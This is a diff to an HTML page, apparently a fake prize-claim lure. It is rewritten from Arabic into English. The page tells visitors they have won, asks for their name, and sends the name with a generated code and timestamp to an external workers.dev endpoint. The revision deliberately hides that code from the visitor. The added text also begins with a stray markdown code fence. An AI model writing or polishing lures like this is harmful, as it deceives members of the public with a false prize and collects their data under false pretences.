@@ -1,1 +1,250 @@
-DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تهانينا لقد ربحت</title><style>*{box-sizing:border-box}body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;font-family:tahoma;background:radial-gradient(circle at top,#294fb2 0%,#142d76 42%,#071642 100%);color:#fff}.card{width:100%;max-width:430px;padding:34px 24px 28px;text-align:center;border:1px solid rgba(120,175,255,.35);border-radius:28px;background:linear-gradient(180deg,rgba(19,48,119,.96),rgba(9,31,82,.98))}.icon{width:100px;height:100px;margin:0 auto 24px;font-size:46px}h1{margin:0 0 14px;font-size:28px;background:linear-gradient(90deg,#23d8ff,#8c5cff);-webkit-background-clip:text;background-clip:text;color:transparent}.desc{margin:0 auto 24px;color:#e8efff}input{width:100%;padding:15px;margin-bottom:15px;border:1px solid rgba(120,175,255,.4);border-radius:12px;background:rgba(0,0,0,.2);color:#fff;font-size:16px}input::placeholder{color:#a8bfff}.send-btn{width:100%;padding:17px;border:0;border-radius:16px;color:white;font-size:19px;font-weight:700;background:linear-gradient(90deg,#168cff,#6c48ed);cursor:pointer}#msg{margin-top:15px;font-weight:bold}</style></head><body><main class="card"><div class="icon">🎁</div><h1>تهانينا! لقد ربحت!</h1><p class="desc">ادخل اسمك واضغط الزر لاستلام جائزتك</p><form id="f"><input type="text" id="name" placeholder="اكتب اسمك هنا" required><button class="send-btn" type="submit">📤 المطالبة بالجائزة</button></form><p id="msg"></p></main><script>const URL="https://tilgram-sand.aamirkhoya.workers.dev/";function code(){return Math.random().toString(36).substr(2,6).toUpperCase()}document.getElementById('f').onsubmit=async(e)=>{e.preventDefault();let n=document.getElementById('name').value;let c=code();document.getElementById('msg').innerText="جاري الارسال...";try{await fetch(URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:n,code:c,page:"Prize",time:new Date().toLocaleString("ar-MA")})});document.getElementById('msg').innerText="✅ تم! الكود السري: "+c;document.getElementById('msg').style.color="#4ade80"}catch{document.getElementById('msg').innerText="❌ خطأ";document.getElementById('msg').style.color="#f87171"}}</script></body></html>
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Congratulations! You Won</title>
+
+<style>
+*{
+  box-sizing:border-box;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:24px;
+  font-family:Tahoma,Arial,sans-serif;
+  background:radial-gradient(
+    circle at top,
+    #294fb2 0%,
+    #142d76 42%,
+    #071642 100%
+  );
+  color:#fff;
+}
+
+.card{
+  width:100%;
+  max-width:430px;
+  padding:34px 24px 28px;
+  text-align:center;
+  border:1px solid rgba(120,175,255,.35);
+  border-radius:28px;
+  background:linear-gradient(
+    180deg,
+    rgba(19,48,119,.96),
+    rgba(9,31,82,.98)
+  );
+  box-shadow:0 20px 60px rgba(0,0,0,.35);
+}
+
+.icon{
+  width:100px;
+  height:100px;
+  margin:0 auto 24px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:55px;
+}
+
+h1{
+  margin:0 0 14px;
+  font-size:28px;
+  background:linear-gradient(90deg,#23d8ff,#8c5cff);
+  -webkit-background-clip:text;
+  background-clip:text;
+  color:transparent;
+}
+
+.desc{
+  margin:0 auto 24px;
+  color:#e8efff;
+  line-height:1.6;
+}
+
+input{
+  width:100%;
+  padding:15px;
+  margin-bottom:15px;
+  border:1px solid rgba(120,175,255,.4);
+  border-radius:12px;
+  background:rgba(0,0,0,.2);
+  color:#fff;
+  font-size:16px;
+  outline:none;
+}
+
+input::placeholder{
+  color:#a8bfff;
+}
+
+.send-btn{
+  width:100%;
+  padding:17px;
+  border:0;
+  border-radius:16px;
+  color:white;
+  font-size:19px;
+  font-weight:700;
+  background:linear-gradient(90deg,#168cff,#6c48ed);
+  cursor:pointer;
+}
+
+.send-btn:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
+
+#msg{
+  margin-top:15px;
+  font-weight:bold;
+  min-height:22px;
+}
+</style>
+</head>
+
+<body>
+
+<main class="card">
+
+  <div class="icon">🎁</div>
+
+  <h1>Congratulations! You Won!</h1>
+
+  <p class="desc">
+    Enter your name and click the button to claim your prize.
+  </p>
+
+  <form id="f">
+
+    <input
+      type="text"
+      id="name"
+      placeholder="Enter your name"
+      maxlength="50"
+      required
+    >
+
+    <button class="send-btn" id="sendBtn" type="submit">
+      📤 Claim My Prize
+    </button>
+
+  </form>
+
+  <p id="msg"></p>
+
+</main>
+
+<script>
+
+const WORKER_URL =
+"https://tilgram-sand.aamirkhoya.workers.dev/";
+
+/* Generate a random code */
+function generateCode(length = 8){
+
+  const characters =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+  let result = "";
+
+  for(let i = 0; i < length; i++){
+
+    result += characters.charAt(
+      Math.floor(Math.random() * characters.length)
+    );
+
+  }
+
+  return result;
+}
+
+document.getElementById("f").addEventListener("submit", async function(e){
+
+  e.preventDefault();
+
+  const name =
+    document.getElementById("name").value.trim();
+
+  const msg =
+    document.getElementById("msg");
+
+  const button =
+    document.getElementById("sendBtn");
+
+  if(!name){
+    return;
+  }
+
+  /*
+    The code is generated and sent to the Worker,
+    but it is NEVER displayed on the page.
+  */
+  const secretCode = generateCode(8);
+
+  msg.innerText = "Processing...";
+  msg.style.color = "#ffffff";
+
+  button.disabled = true;
+
+  try{
+
+    const response = await fetch(WORKER_URL,{
+
+      method:"POST",
+
+      headers:{
+        "Content-Type":"application/json"
+      },
+
+      body:JSON.stringify({
+
+        username:name,
+
+        code:secretCode,
+
+        page:"Prize",
+
+        time:new Date().toISOString()
+
+      })
+
+    });
+
+    if(!response.ok){
+      throw new Error("Request failed");
+    }
+
+    /*
+      Secret code is NOT shown to the user.
+    */
+    msg.innerText =
+      "✅ Your request has been submitted successfully.";
+
+    msg.style.color = "#4ade80";
+
+  }catch(error){
+
+    msg.innerText =
+      "❌ Something went wrong. Please try again.";
+
+    msg.style.color = "#f87171";
+
+    button.disabled = false;
+
+  }
+
+});
+
+</script>
+
+</body>
+</html>
+```
